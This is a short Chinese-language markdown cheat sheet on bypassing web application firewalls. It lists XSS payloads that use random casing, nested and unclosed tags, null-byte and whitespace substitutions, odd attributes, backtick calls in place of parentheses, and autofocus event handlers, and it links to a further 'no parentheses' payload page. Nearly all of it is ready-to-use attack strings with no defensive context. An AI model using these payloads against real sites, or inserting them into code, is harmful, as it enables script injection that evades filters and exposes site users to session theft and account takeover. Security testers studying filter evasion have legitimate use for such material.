## WAF绕过

### 黑名单绕过

```javascript
//随机大小写
<script> --> <ScrIpT>
<img --> <ImG

//双标签
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//替换空格分隔属性
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//父标签
<svg><x><script>alert('1'&#41</x>

//奇怪属性
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///注意换行符
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//不关闭标签， " <" 或 " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//额外打开
<<script>alert("XSS");//<</script>

//编写奇怪的标签
<</script/script><script>
<input type=image src onerror="prompt(1)">

//使用 `` 代替括号
onerror=alert`1`

//使用多个标签
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```


### 不带括号

[我括号呢](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/XSS/Without-Parentheses.md)
